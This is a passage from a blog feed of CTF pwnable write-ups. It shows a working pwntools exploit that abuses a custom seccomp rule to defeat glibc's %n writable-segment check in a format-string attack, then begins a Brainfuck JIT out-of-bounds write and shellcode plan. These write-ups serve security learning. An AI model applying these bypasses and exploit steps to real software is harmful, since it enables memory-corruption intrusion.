&lt;p&gt;OK, so we successfully overwrite the seccomp rule, but still the &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt; payload was blocked by &lt;code class=&quot;highlighter-rouge&quot;&gt;_fprintf_chk&lt;/code&gt;, which is a more secure version of &lt;code class=&quot;highlighter-rouge&quot;&gt;fprintf&lt;/code&gt;. At this point I started to think that maybe we need to write some seccomp rules to bypass the format string check.&lt;/p&gt;

&lt;p&gt;And so I started reading the &lt;a href=&quot;https://code.woboq.org/userspace/glibc/stdio-common/vfprintf.c.html#__readonly_area&quot;&gt;glibc source code&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;................&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;                                                                      \
      &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__readonly_area&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                      \
        &lt;span class=&quot;n&quot;&gt;attribute_hidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                              \
      &lt;span class=&quot;n&quot;&gt;readonly_format&lt;/span&gt;                                                      \
        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__readonly_area&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;STR_LEN&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;              \
                                    &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CHAR_T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;              \
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;                                                                      \
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readonly_format&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                              \
    &lt;span class=&quot;n&quot;&gt;__libc_fatal&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;*** %n in writable segment detected ***&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;              \
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hmmmm, looks like we’ll have to make &lt;code class=&quot;highlighter-rouge&quot;&gt;readonly_format &amp;gt;= 0&lt;/code&gt; so it won’t call &lt;code class=&quot;highlighter-rouge&quot;&gt;__libc_fatal (&quot;*** %n in writable segment detected ***\n&quot;);&lt;/code&gt;. Let’s trace into the &lt;a href=&quot;https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/readonly-area.c.html#__readonly_area&quot;&gt;__readonly_area() function&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__readonly_area&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/maps&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rce&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;cm&quot;&gt;/* It is the system administrator's choice to not have /proc
         available to this process (e.g., because it runs in a chroot
         environment.  Don't fail in this case.  */&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errno&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ENOENT&lt;/span&gt;
          &lt;span class=&quot;cm&quot;&gt;/* The kernel has a bug in that a process is denied access
             to the /proc filesystem if it is set[ug]id.  There has
             been no willingness to change this in the kernel so
             far.  */&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errno&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EACCES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...................&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ah ha ! We can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;__readonly_area&lt;/code&gt; will call &lt;code class=&quot;highlighter-rouge&quot;&gt;fopen()&lt;/code&gt;, and see if its &lt;code class=&quot;highlighter-rouge&quot;&gt;errno&lt;/code&gt; is equals to &lt;code class=&quot;highlighter-rouge&quot;&gt;EACCES&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;ENOENT&lt;/code&gt;. &lt;strong&gt;If so, it will return 1&lt;/strong&gt; !! Since we can write our own seccomp rule, we can totally make this happen !&lt;/p&gt;

&lt;p&gt;So first we create our own seccomp rule:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# # check if arch is X86_64
A = arch
A == 0xc000003e ? next : ok
A = sys_number
A == open ? next : ok
A = args[2]
A == 0x1b6 ? magic : ok # check the 3rd arg of open()
magic:
return ERRNO(13) # ERRNO(EACCES)
ok:
return ALLOW
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notice that in order to make &lt;code class=&quot;highlighter-rouge&quot;&gt;open(&quot;flag.txt&quot;, 0x80000)&lt;/code&gt; ( in the &lt;code class=&quot;highlighter-rouge&quot;&gt;openflag()&lt;/code&gt; function ) works normally, we’ll have to add the rule &lt;code class=&quot;highlighter-rouge&quot;&gt;A == 0x1b6 ? magic : ok&lt;/code&gt;. This indicates that if the 3rd argument of &lt;code class=&quot;highlighter-rouge&quot;&gt;open()&lt;/code&gt; equals to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1b6&lt;/code&gt;, return &lt;code class=&quot;highlighter-rouge&quot;&gt;ERRNO(13)&lt;/code&gt;, otherwise allow the system call. I wrote this rule because I found that when &lt;code class=&quot;highlighter-rouge&quot;&gt;__readonly_area()&lt;/code&gt; calls &lt;code class=&quot;highlighter-rouge&quot;&gt;fopen (&quot;/proc/self/maps&quot;, &quot;rce&quot;);&lt;/code&gt;, the 3rd argument of &lt;code class=&quot;highlighter-rouge&quot;&gt;open()&lt;/code&gt; was exactly &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1b6&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;By using the &lt;a href=&quot;https://github.com/david942j/seccomp-tools#asm&quot;&gt;asm&lt;/a&gt; feature of the seccomp-tools, we can generate the raw bytes of our seccomp rule:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat ./rule 
# # check if arch is X86_64
A = arch
A == 0xc000003e ? next : ok
A = sys_number
A == open ? next : ok
A = args[2]
A == 0x1b6 ? magic : ok
magic:
return ERRNO(13)
ok:
return ALLOW

$ seccomp-tools asm ./rule
&quot; \x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x05&amp;gt;\x00\x00\xC0 \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00 \x00\x00\x00 \x00\x00\x00\x15\x00\x00\x01\xB6\x01\x00\x00\x06\x00\x00\x00\r\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F&quot;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At last we apply our seccomp rule, exploit the format string vulnerability to bypass the check and get the flag:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# from brucepwn import *&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;35.198.105.104&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ELF_PATH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;./flag_store&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LIBC_PATH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF_PATH&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'INFO'&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'tmux'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'splitw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# for gdb.attach&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# context.binary is an ELF object&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LIBC_PATH&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LIBC_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;warning&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to load libc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#r = elf.process() # elf.process(argv=[argv1, argv2,...])&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00\xC0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00\x00\x15\x00\x00\x01\xB6\x01\x00\x00\x06\x00\x00\x00\r\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;len:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%128&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%128&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;hhn&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;hxp{d0n7_w0rry_glibc_1_571ll_l0v3_y0u}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;First blood on this one ! WOOHOO ! 😎&lt;/p&gt;</content><author><name>Bruce Chen</name></author><category term="CTF" /><category term="Pwnable" /><category term="Python" /><category term="BOF" /><category term="format_string" /><category term="seccomp" /><category term="hxp" /><summary type="html">Category: Pwnable</summary></entry><entry><title type="html">MeePwn CTF 2017 – Brainfuck 1 &amp;amp; 2</title><link href="http://0.0.0.0:4000/MeePwn-CTF-2017-Brainfuck-1-2/" rel="alternate" type="text/html" title="MeePwn CTF 2017 -- Brainfuck 1 &amp; 2" /><published>2017-07-16T23:28:00+08:00</published><updated>2017-07-16T23:28:00+08:00</updated><id>http://0.0.0.0:4000/MeePwn-CTF-2017-Brainfuck-1-2</id><content type="html" xml:base="http://0.0.0.0:4000/MeePwn-CTF-2017-Brainfuck-1-2/">&lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Pwnable&lt;/p&gt;

&lt;p&gt;Both binaries are 64 bit ELF, No RELRO, No canary, PIE &amp;amp; NX enabled.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h2 id=&quot;brainfuck1&quot;&gt;Brainfuck1&lt;/h2&gt;

&lt;p&gt;The program is a simple &lt;a href=&quot;https://en.wikipedia.org/wiki/Brainfuck&quot;&gt;brainfuck&lt;/a&gt; language interpreter: it read input ( brainfuck code ), translate the code to the corresponding x86 machine code and execute it.&lt;/p&gt;

&lt;p&gt;For example, if we input &lt;code class=&quot;highlighter-rouge&quot;&gt;+++++++++&lt;/code&gt; ( 9 &lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt; ), the program will translate the code into the following machine code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x7ffff7ff5000:      push   rbp
0x7ffff7ff5001:      mov    rbp,rsp
0x7ffff7ff5004:      sub    rsp,0x20
0x7ffff7ff5008:      mov    r14,rdi   ; r14 is the data pointer 
0x7ffff7ff500b:      add    BYTE PTR [r14],0x9  ; [r14] += 9 
0x7ffff7ff500f:      add    rsp,0x20
0x7ffff7ff5013:      pop    rbp
0x7ffff7ff5014:      ret 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The program has the following data structure:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bf_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// data pointer
&lt;/span&gt;    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// machine code buffer
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_16&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// not sure about the usage
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sc_pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// machine code position
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sc_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// machine code buffer size
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data&lt;/code&gt; is placed on the heap memory. It will treat &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;dp&lt;/code&gt; as the first parameter while executing the machine code.&lt;/p&gt;

&lt;p&gt;The vulnerability is quite simple: it did not have the boundary check for the data pointer increment/decrement. For example, it we input 1000 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt; and a &lt;code class=&quot;highlighter-rouge&quot;&gt;,&lt;/code&gt;, we can write a byte at &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;dp + 1000&lt;/code&gt;, thus we have an out-of-bound read/write vulnerability.&lt;/p&gt;

&lt;p&gt;Here’s the basic concept of how I exploit the service:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Leak the machine code buffer address ( an mmap address with &lt;code class=&quot;highlighter-rouge&quot;&gt;rwx&lt;/code&gt; permission )&lt;/li&gt;
  &lt;li&gt;Place our shellcode on the mmap buffer&lt;/li&gt;
  &lt;li&gt;Self-modified the machine code in &lt;code class=&quot;highlighter-rouge&quot;&gt;bf_data-&amp;gt;sc_buf&lt;/code&gt; so it will jump to our shellcode buffer and execute our shellcode.&lt;/li&gt;
&lt;/ol&gt;

